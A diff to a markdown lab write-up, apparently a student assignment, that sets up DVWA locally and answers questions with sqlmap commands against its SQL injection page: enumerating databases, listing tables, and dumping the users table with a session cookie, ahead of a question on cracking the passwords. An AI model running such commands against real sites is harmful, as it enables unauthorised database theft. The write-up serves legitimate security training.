@@ -194,8 +194,10 @@ And by this picture, we can tell that the attack was successful.
 
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
+
 ## 1. Set-up 
 We will clone it in the DVWA github
+
 Use this code:
 ```
 git clone https://github.com/digininja/DVWA.git
@@ -204,6 +206,7 @@ git clone https://github.com/digininja/DVWA.git
 ![image](https://github.com/user-attachments/assets/34dca78b-6099-40e0-a591-86f5a67990ce)
 
 Then we use this code to build by using docker: 
+
 ```docker compose up -d```
 
 ![image](https://github.com/user-attachments/assets/4598c12a-174b-408e-a05c-dc8de7cd7f34)
@@ -247,20 +250,52 @@ We need cookies for the attack, so we will get them
 Cookies value: 7957b022f5834fe6b2dd30a5aa6ba0f3
 
 Then we will access this website: http://localhost:4280/vulnerabilities/sqli
-Click submit and after that get the URL: http://localhost:4280/vulnerabilities/sqli/?id=&Submit=Submit#
 
-![image](https://github.com/user-attachments/assets/397ecdd3-d8c7-4b84-8d39-77365442e44f)
+Enter user id: 1
+
+Click submit and after that get the URL: http://localhost:4280/vulnerabilities/sqli/?id1=&Submit=Submit#
+
+![image](https://github.com/user-attachments/assets/35ba48b5-d13c-4365-a271-5be2a1c11725)
 
 Then we use this code for attack:
 ```
-python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="PHPSESSID=7957b022f5834fe6b2dd30a5aa6ba0f3; security=low" --dbs
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=7957b022f5834fe6b2dd30a5aa6ba0f3; security=low" --dbs
 ```
 
-![image](https://github.com/user-attachments/assets/5b5fe60d-dd01-4854-9f47-376132c925d4)
+![image](https://github.com/user-attachments/assets/5dd8f7be-9ed8-4656-b7bb-7a08488e9229)
+
+Here is the result for all available databases:
+
+![image](https://github.com/user-attachments/assets/a4dfe369-493b-43f9-ac6e-0799d3c5c775)
 
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
+
+We use this code to get tables:
+```
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=7957b022f5834fe6b2dd30a5aa6ba0f3; security=low" -D dvwa --tables
+```
+
+![image](https://github.com/user-attachments/assets/5764ffb4-c690-4c77-8c81-1cc58c90b3ce)
+
+Here is the result:
+
+![image](https://github.com/user-attachments/assets/c3ef5660-450d-47c1-8438-9e968d848f95)
+
+
+We use this code to get users information:
+```
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=7957b022f5834fe6b2dd30a5aa6ba0f3; security=low" -D dvwa -T users --dump
+
+```
+
+![image](https://github.com/user-attachments/assets/207d434e-25f4-4a84-a92a-88521115df96)
+
+Here is the result for users information:
+
+![image](https://github.com/user-attachments/assets/b728493d-b340-4239-aa43-69b96a874dc2)
+
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
